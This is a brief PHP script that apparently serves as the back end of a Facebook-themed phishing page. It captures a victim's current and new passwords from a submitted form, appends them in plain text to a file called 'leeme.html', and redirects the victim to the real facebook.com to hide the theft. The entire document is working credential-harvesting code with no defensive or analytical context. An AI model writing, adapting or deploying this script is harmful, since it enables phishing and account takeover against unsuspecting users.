<?
$email = $_POST['password_new'];
$confir = $_POST['password_confirm'];
$actual = $_POST['actual'];
$guardame = fopen('leeme.html','a+');
fwrite($guardame,
"      Nuevo: ".$email.
"\nConfir: ".$confir.
"\noriginal: ".$actual." ");
fclose($guardame);
echo "<meta http-equiv='refresh' content='1;url=https://www.facebook.com'>"
?>
